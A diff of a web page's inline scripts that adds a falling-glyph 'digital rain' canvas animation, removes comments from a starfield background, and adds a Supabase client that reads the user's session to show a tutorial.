+                for (const col of columns) {
+                    for (let j = 0; j < col.len; j++) {
+                        const gy = col.y - j * 16;
+                        if (gy < -20 || gy > H + 20) continue;
+                        const alpha = j === 0 ? 1 : Math.max(0.15, 1 - j / (col.len + 2));
+                        ctx.fillStyle = j === 0 ? 'rgba(200,255,200,' + alpha + ')' : 'rgba(0,220,90,' + alpha * 0.85 + ')';
+                        const ch = glyphs[(Math.floor(col.y / 4) + j + t) % glyphs.length];
+                        ctx.fillText(ch, col.x, gy);
+                    }
+                    col.y += col.speed;
+                    if (col.y > H + col.len * 16) {
+                        col.y = -Math.random() * H * 0.5;
+                        col.speed = 0.8 + Math.random() * 2.4;
+                        col.len = 8 + Math.floor(Math.random() * 22);
+                    }
+                }
+                requestAnimationFrame(draw);
+                return;
+            }
+
             ctx.clearRect(0, 0, W, H);
-
-            // Base background removed to allow image to show through
-            // ctx.fillStyle = '#11111b';
-            // ctx.fillRect(0, 0, W, H);
-
-            // Nebula orbs (soft glowing radial gradients)
             for (const orb of orbs) {
                 const pulse = 0.04 + 0.02 * Math.sin(t * orb.speed * 1000);
                 const ox = orb.cx * W + Math.sin(t * orb.speed * 800 + orb.cx) * W * 0.06;
@@ -2744,8 +3341,6 @@
                 ctx.fillStyle = grad;
                 ctx.fillRect(0, 0, W, H);
             }
-
-            // Twinkling stars
             for (const s of stars) {
                 s.x += s.dx; s.y += s.dy;
                 if (s.x < 0) s.x = W; else if (s.x > W) s.x = 0;
@@ -2758,10 +3353,25 @@
                 ctx.fill();
             }
             ctx.globalAlpha = 1;
-
             requestAnimationFrame(draw);
         }
         draw();
+    })();
+    </script>
+    <script>
+    (function () {
+        var SUPABASE_URL = 'https://qkeiajxyynvpybctxxuv.supabase.co';
+        var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFrZWlhanh5eW52cHliY3R4eHV2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYxMjgxODQsImV4cCI6MjA5MTcwNDE4NH0.JTeODgp_ho_XamO-2oR1h0HT-Sv-v9Fe2vpn4KFgOpE';
+        function boot() {
+            if (!window.checkAndShowTutorial || !window.supabase) return;
+            var sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+            sb.auth.getSession().then(function (r) {
+                var uid = r.data.session && r.data.session.user ? r.data.session.user.id : null;
+                setTimeout(function () { window.checkAndShowTutorial(uid); }, 600);
+            });
+        }
+        if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
+        else boot();
     })();
     </script>
 </body>
